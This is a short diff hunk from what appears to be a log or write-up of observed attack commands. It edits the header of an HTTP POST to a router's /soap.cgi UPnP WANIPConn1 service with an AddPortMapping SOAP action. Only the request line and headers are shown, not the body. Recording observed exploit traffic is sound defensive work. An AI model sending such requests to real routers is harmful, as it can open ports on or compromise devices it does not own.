@@ -17,7 +17,7 @@ Commands/exploits observed :
 
 
 POST /soap.cgi?service=WANIPConn1 HTTP/1.1
-Host: <host IP>
+Host: <Host IP>
 Content-Length: 630
 Accept-Encoding: gzip, deflate
 SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
